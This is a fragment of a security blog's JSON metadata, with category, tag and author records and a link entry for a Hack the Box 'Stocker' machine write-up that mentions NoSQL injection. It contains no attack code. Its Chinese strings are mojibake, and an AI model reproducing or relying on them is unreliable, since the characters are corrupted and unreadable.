","slug":"ç½‘ç»œå®‰å…¨å­¦ä¹ ","count":26,"path":"api/categories/ç½‘ç»œå®‰å…¨å­¦ä¹ .json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"å¿…é¡»ä»è¿‡å»çš„é”™è¯¯å­¦ä¹ æ•™è®­ï¼Œè€Œéä¾èµ–è¿‡å»çš„æˆåŠŸ","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"htbã®Machines","uid":"4497d51e9ba49087760c38d70069b58c","slug":"htb(Machines)","date":"2023-02-13T14:10:53.464Z","updated":"2023-08-06T07:53:48.898Z","comments":true,"path":"api/articles/htb(Machines).json","keywords":null,"cover":"/img/10.jpg","text":"Machines Machinesã€WEBã€‘Stocker[easy]ä¸ªäººæ„Ÿè§‰æ–°ä¸œè¥¿å¤ªå¤šï¼Œéš¾åº¦å¯¹äºå¼€å§‹å¯èƒ½ä¸­ä¸Š è¯·å…ˆäº†è§£å­¦ä¹  NoSQLæ³¨å…¥ apiåˆ©ç”¨ é€šè¿‡i...","permalink":"/post/htb(Machines)","photos":[],"count_time":{"symbolsCount":112,"symbolsTime":"1 mins."},"categories":[{"name":"Hack the Box","slug":"Hack-the-Box","count":2,"path":"api/categories/Hack-the-Box.json"}],"tags":[{"name":"htb","slug":"htb","count":2,"path":"api/tags/htb.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"å¿…é¡»ä»è¿‡å»çš„é”™è¯¯å­¦ä¹ æ•™è®­ï¼Œè€Œéä¾èµ–è¿‡å»çš„æˆåŠŸ","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}